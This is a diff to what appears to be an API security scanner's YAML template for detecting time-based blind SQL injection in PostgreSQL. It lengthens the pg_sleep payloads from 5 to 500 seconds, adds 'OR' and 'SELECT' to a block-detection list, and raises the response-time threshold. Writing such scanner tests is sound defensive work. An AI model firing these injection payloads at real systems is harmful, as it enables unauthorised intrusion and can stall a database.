@@ -76,10 +76,10 @@ api_selection_filters:
         extract: userVal
 wordLists:
   timeBasedPayloads:
-    - "' OR 1=1; SELECT pg_sleep(5) -- -"
-    - "' OR CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -"
-    - "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) -- -"
-    - "' OR (SELECT pg_sleep(5) WHERE (SELECT COUNT(*) FROM users) > 10) -- -"
+    - "' OR 1=1; SELECT pg_sleep(500) -- -"
+    - "' OR CASE WHEN (1=1) THEN pg_sleep(500) ELSE pg_sleep(0) END -- -"
+    - "' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(500) ELSE pg_sleep(0) END) -- -"
+    - "' OR (SELECT pg_sleep(500) WHERE (SELECT COUNT(*) FROM users) > 10) -- -"
 execute:
   type: multiple
   requests:
@@ -124,6 +124,8 @@ execute:
                 - CloudFlare
                 - Sorry, you have been blocked
                 - " OR "
+                - "OR"
+                - "SELECT"
         - success: x2
         - failure: exit
     - req:
@@ -136,7 +138,7 @@ validate:
   and:
     - compare_greater:
         - ${x2.response.stats.median_response_time}
-        - 5001
+        - 15001
     - compare_greater:
         - ${x2.response.stats.median_response_time}
         - ${x1.response.stats.median_response_time} * 5
